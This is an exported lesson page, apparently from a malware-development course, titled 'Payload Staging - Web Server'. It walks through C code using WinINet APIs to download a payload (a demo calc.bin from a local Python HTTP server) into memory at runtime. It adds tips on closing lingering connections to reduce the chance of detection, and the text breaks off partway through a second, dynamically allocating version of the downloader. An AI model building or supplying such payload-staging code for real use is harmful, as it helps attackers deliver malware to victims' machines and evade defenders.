<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>30. Payload Staging - Web Server</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="eda456e5-2641-44a5-8961-20955cee9540" class="page sans"><header><h1 class="page-title"><a href="https://maldevacademy.com/modules/30"><strong>30. Payload Staging - Web Server</strong></a></h1></header><div class="page-body"><h2 id="f71424e0-65b2-4f78-ae0a-2c1ff2a870a4" class=""><strong>Payload Staging - Web Server</strong></h2><h3 id="55a2df69-1cee-4831-a223-91df753731b8" class=""><strong>Introduction</strong></h3><p id="64390b52-7c9e-4344-8b02-8992f5add61a" class="">Throughout the modules thus far, the payload has been consistently stored directly within the binary. This is a fast and commonly used method to fetch the payload. Unfortunately, in some cases where payload size constraints exist, saving the payload inside the code is not a feasible approach. The alternative approach is to host the payload on a web server and fetch it during execution.</p><h3 id="62857d75-7ab1-4041-a640-ba97dcda683f" class=""><strong>Setting Up The Web Server</strong></h3><p id="5cae076b-5554-40ea-a43c-d5ffdcb44b62" class="">This module requires a web server to host the payload file. The easiest way is to use <a href="https://docs.python.org/3/library/http.server.html">Python&#x27;s HTTP server</a> using the following command:</p><p id="57dd4a91-0d1a-43e1-8291-b3c4131e9e3a" class=""><code>python -m http.server 8000</code></p><p id="22fab897-3e2c-45f9-928a-d0c5fef0cd98" class="">Note that the payload file should be hosted in the same directory where this command is executed.</p><figure id="e35f1779-35be-485a-81da-df602782a067" class="image"><a href="30%20Payload%20Staging%20-%20Web%20Server%20eda456e5264144a5896120955cee9540/python-http-server.png"><img style="width:817px" src="30%20Payload%20Staging%20-%20Web%20Server%20eda456e5264144a5896120955cee9540/python-http-server.png"/></a></figure><p id="86797aef-7869-44be-ad08-7070f6458a6d" class="">To verify the web server is working, head to <a href="http://127.0.0.1:8000/">http://127.0.0.1:8000</a> using the browser.</p><figure id="60b49138-609f-4c66-aae6-36d2b2c4ebdc" class="image"><a href="30%20Payload%20Staging%20-%20Web%20Server%20eda456e5264144a5896120955cee9540/python-http-server-2.png"><img style="width:1126px" src="30%20Payload%20Staging%20-%20Web%20Server%20eda456e5264144a5896120955cee9540/python-http-server-2.png"/></a></figure><h3 id="8d2cf907-370a-47a9-b02e-5d6b6d5bdb06" class=""><strong>Fetching The Payload</strong></h3><p id="8e469dc4-9c20-462a-9a58-d8c22ae51f51" class="">To fetch the payload from the web server, the following Windows APIs will be used:</p><ul id="e3d0f8c3-6a4a-4bd5-a0cf-910420f92b43" class="bulleted-list"><li style="list-style-type:disc"><a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenw">InternetOpenW</a> - Opens an internet session handle which is a prerequisite to using the other Internet Windows APIs</li></ul><ul id="ab953591-1d0a-4ffb-a6f6-5e738327447d" class="bulleted-list"><li style="list-style-type:disc"><a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurlw">InternetOpenUrlW</a> - Open a handle to the specified resource which is the payload&#x27;s URL.</li></ul><ul id="60a9d956-6548-49df-b101-d221c35f4b60" class="bulleted-list"><li style="list-style-type:disc"><a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetreadfile">InternetReadFile</a> - Reads data from the web resource handle. This is the handle opened by <code>InternetOpenUrlW</code>.</li></ul><ul id="338d9234-bb6c-401c-b78b-8a8641c528ba" class="bulleted-list"><li style="list-style-type:disc"><a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetclosehandle">InternetCloseHandle</a> - Closes the handle.</li></ul><ul id="9b34d482-534d-41de-8b74-acf236b5a817" class="bulleted-list"><li style="list-style-type:disc"><a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetsetoptionw">InternetSetOptionW</a> - Sets an Internet option.</li></ul><h3 id="f87371ee-b532-4a01-a9b4-f3e12b80b19f" class=""><strong>Opening An Internet Session</strong></h3><p id="d395ce34-fae9-4265-9630-76bd30676519" class="">The first step is to open an internet session handle using <a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenw">InternetOpenW</a> which initializes an application&#x27;s use of the WinINet functions. All the parameters being passed to the WinAPI are <code>NULL</code> since they are mainly for proxy-related matters. It is worth noting that having the second parameter set to <code>NULL</code> is equivalent to using <code>INTERNET_OPEN_TYPE_PRECONFIG</code>, which specifies that the system&#x27;s current configuration should be used to determine the proxy settings for the Internet connection.</p><pre id="695b32cd-525d-4939-a8ca-ea73e01ec0e9" class="code code-wrap"><code>HINTERNET InternetOpenW(
  [in] LPCWSTR lpszAgent,       // NULL
  [in] DWORD   dwAccessType,    // NULL or INTERNET_OPEN_TYPE_PRECONFIG
  [in] LPCWSTR lpszProxy,       // NULL
  [in] LPCWSTR lpszProxyBypass, // NULL
  [in] DWORD   dwFlags          // NULL
);
</code></pre><p id="e874a493-3450-435d-bf1b-7d9c40b4fbf4" class="">Calling the function is shown in the snippet below.</p><pre id="b58aa744-45ea-44d4-9cf5-c42bad49a4df" class="code code-wrap"><code>// Opening an internet session handle
hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
</code></pre><h3 id="d3989c11-9d0d-44ee-b561-95478fd4e074" class=""><strong>Opening a Handle To Payload</strong></h3><p id="953044e9-9dca-4d88-9086-7388fea02d8d" class="">Moving on to the next WinAPI used, <a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurlw">InternetOpenUrlW</a>, where a connection is being established to the payloads&#x27;s URL.</p><pre id="19a2bb78-fe13-4918-9dbe-93b0c5a38db9" class="code code-wrap"><code>HINTERNET InternetOpenUrlW(
  [in] HINTERNET hInternet,       // Handle opened by InternetOpenW
  [in] LPCWSTR   lpszUrl,         // The payload&#x27;s URL
  [in] LPCWSTR   lpszHeaders,     // NULL
  [in] DWORD     dwHeadersLength, // NULL
  [in] DWORD     dwFlags,         // INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
  [in] DWORD_PTR dwContext        // NULL
);
</code></pre><p id="9fb5a005-988b-436f-b154-6a27a6731084" class="">Calling the function is shown in the snippet below. The fifth parameter of the function uses <code>INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID</code> to achieve a higher success rate with the HTTP request in case of an error on the server side. It&#x27;s possible to use additional flags such as <code>INTERNET_FLAG_IGNORE_CERT_CN_INVALID</code> but that will be left up to the reader. The flags are well explained in Microsoft&#x27;s <a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurlw">documentation</a>.</p><pre id="6e345b67-b2a3-44e2-b409-9899fc719685" class="code code-wrap"><code>// Opening a handle to the payload&#x27;s URL
hInternetFile = InternetOpenUrlW(hInternet, L&quot;http://127.0.0.1:8000/calc.bin&quot;, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
</code></pre><h3 id="d57f3529-e1b5-4d90-8819-fc5c8c3cf080" class=""><strong>Reading Data</strong></h3><p id="4c55bc60-f418-4386-9e7e-6a55a6c77d80" class=""><a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetreadfile">InternetReadFile</a> is the next WinAPI used which will read the payload.</p><pre id="0f444b15-d763-4142-88bf-92b4676a1677" class="code code-wrap"><code>BOOL InternetReadFile(
  [in]  HINTERNET hFile,                  // Handle opened by InternetOpenUrlW
  [out] LPVOID    lpBuffer,               // Buffer to store the payload
  [in]  DWORD     dwNumberOfBytesToRead,  // The number of bytes to read
  [out] LPDWORD   lpdwNumberOfBytesRead   // Pointer to a variable that receives the number of bytes read
);
</code></pre><p id="74fc780c-0f8b-4b1e-a59b-d4c5a5cece59" class="">Before calling the function, a buffer must be allocated to hold the payload. Therefore, <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-localalloc">LocalAlloc</a> is used to allocate a buffer the same size as the payload, 272 bytes. Once the buffer has been allocated, <code>InternetReadFile</code> can be used to read the payload. The function requires the number of bytes to read which in this case is <code>272</code>.</p><pre id="22c5f34c-9ab1-4e0e-bb2e-a4455ea04ed5" class="code code-wrap"><code>pBytes = (PBYTE)LocalAlloc(LPTR, 272);
InternetReadFile(hInternetFile, pBytes, 272, &amp;dwBytesRead)
</code></pre><h3 id="06e68049-be0c-4c9f-9852-bec74c00f12d" class=""><strong>Closing InterntHandle</strong></h3><p id="18e90fa0-d71f-4a77-b7ea-bcb0fc1f875a" class=""><a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetclosehandle">InternetCloseHandle</a> is used to close an internet handle. This should be called once the payload has been successfully fetched.</p><pre id="69cf042b-7791-4c3b-b483-bd3968944fcd" class="code code-wrap"><code>BOOL InternetCloseHandle(
  [in] HINTERNET hInternet // Handle opened by InternetOpenW &amp; InternetOpenUrlW
);
</code></pre><h3 id="19be6b3d-f210-4c9c-8592-ee55f8939e00" class=""><strong>Closing HTTP/S Connections</strong></h3><p id="03927e2c-4216-4a5c-8731-153eb47221d0" class="">It&#x27;s important to be aware that the <code>InternetCloseHandle</code> WinAPI does not close the HTTP/S connection. WinInet tries to reuse connections and therefore although the handle was closed, the connection remains active. Closing the connection is vital to lessen the possibility of detection. For example, a binary was created that fetches a payload from GitHub. The image below shows the binary still connected to GitHub although the binary&#x27;s execution was completed.</p><figure id="5b3680ae-d9f9-42f7-a868-b8f90da17f4c" class="image"><a href="30%20Payload%20Staging%20-%20Web%20Server%20eda456e5264144a5896120955cee9540/staging-github.png"><img style="width:1156px" src="30%20Payload%20Staging%20-%20Web%20Server%20eda456e5264144a5896120955cee9540/staging-github.png"/></a></figure><p id="d6f849d4-c260-45ef-96f2-b5159dafac21" class="">Luckily, the solution is quite simple. All that is required is to tell WinInet to close all the connections using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetsetoptionw">InternetSetOptionW</a> WinAPI.</p><pre id="612e87dc-d891-4b28-8955-998530d6f70d" class="code code-wrap"><code>BOOL InternetSetOptionW(
  [in] HINTERNET hInternet,     // NULL
  [in] DWORD     dwOption,      // INTERNET_OPTION_SETTINGS_CHANGED
  [in] LPVOID    lpBuffer,      // NULL
  [in] DWORD     dwBufferLength // 0
);
</code></pre><p id="3e0c3e04-b8f6-42da-92eb-078f764cdd59" class="">Calling <code>InternetSetOptionW</code> with the <code>INTERNET_OPTION_SETTINGS_CHANGED</code> flag will cause the system to update the cached version of its internet settings and thus resulting in the connections saved by WinInet being closed.</p><pre id="1f7c277a-c9ad-4bdf-94b4-2e9454e7237d" class="code code-wrap"><code>InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
</code></pre><h3 id="9f70806d-0676-4eae-8462-f3f7a46d07e5" class=""><strong>Payload Staging - Code Snippet</strong></h3><p id="457c3439-8770-4d3a-bffc-3e8d904b766a" class=""><code>GetPayloadFromUrl</code> is a function that uses the previously discussed steps to fetch the payload from a remote server and stores it in a buffer.</p><pre id="69e6ff22-0ac3-4c11-84bc-4b882911eb93" class="code code-wrap"><code>BOOL GetPayloadFromUrl() {

	HINTERNET	hInternet              = NULL,
			    hInternetFile          = NULL;

	PBYTE		pBytes                 = NULL;

	DWORD		dwBytesRead            = NULL;

	// Opening an internet session handle
	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		printf(&quot;[!] InternetOpenW Failed With Error : %d \n&quot;, GetLastError());
		return FALSE;
	}

	// Opening a handle to the payload&#x27;s URL
	hInternetFile = InternetOpenUrlW(hInternet, L&quot;http://127.0.0.1:8000/calc.bin&quot;, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		printf(&quot;[!] InternetOpenUrlW Failed With Error : %d \n&quot;, GetLastError());
		return FALSE;
	}

	// Allocating a buffer for the payload
	pBytes = (PBYTE)LocalAlloc(LPTR, 272);

	// Reading the payload
	if (!InternetReadFile(hInternetFile, pBytes, 272, &amp;dwBytesRead)) {
		printf(&quot;[!] InternetReadFile Failed With Error : %d \n&quot;, GetLastError());
		return FALSE;
	}

	InternetCloseHandle(hInternet);
	InternetCloseHandle(hInternetFile);
	InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	LocalFree(pBytes);

	return TRUE;
}

</code></pre><h3 id="2713c7c5-e290-4b98-b72e-2379c5a8f870" class=""><strong>Dynamic Payload Size Allocation</strong></h3><p id="a6ff292f-01f5-44c0-aa91-b35a956342c9" class="">The above implementation works when the payload size is known. When the size is unknown or is larger than the number of bytes specified in <code>InternetReadFile</code>, a heap overflow will occur resulting in the binary crashing.</p><p id="1f4905be-bf0f-4bf1-9b5a-848cbbf7ee92" class="">One way to solve this issue is by placing <code>InternetReadFile</code> inside a while loop and continuously reading a constant value of bytes, which for this example will be <code>1024</code> bytes. The bytes are stored directly in a temporary buffer which will be of the same size, <code>1024</code>. The temporary buffer will be appended to the total bytes buffer which will continuously be reallocated to fit each newly read <code>1024</code> byte chunk. Once <code>InternetReadFile</code> reads a value that is less than <code>1024</code> then that&#x27;s the indicator that it has reached the end of the file and will break out of the loop.</p><h3 id="bef454e6-80dc-4443-806c-7607bf0839a0" class=""><strong>Payload Staging With Dynamic Allocation - Code Snippet</strong></h3><pre id="c5f3b597-a7f4-40b8-941c-dab33fe93e7f" class="code code-wrap"><code>BOOL GetPayloadFromUrl() {

	HINTERNET	hInternet              = NULL,
			    hInternetFile          = NULL;

	DWORD		dwBytesRead            = NULL;

	SIZE_T		sSize                   = NULL; // Used as the total payload size

	PBYTE		pBytes                  = NULL; // Used as the total payload heap buffer
	PBYTE		pTmpBytes               = NULL; // Used as the temp buffer of size 1024 bytes

	// Opening an internet session handle
	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		printf(&quot;[!] InternetOpenW Failed With Error : %d \n&quot;, GetLastError());
		return FALSE;
	}

	// Opening a handle to the payload&#x27;s URL
	hInternetFile = InternetOpenUrlW(hInternet, L&quot;http://127.0.0.1:8000/calc.bin&quot;, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
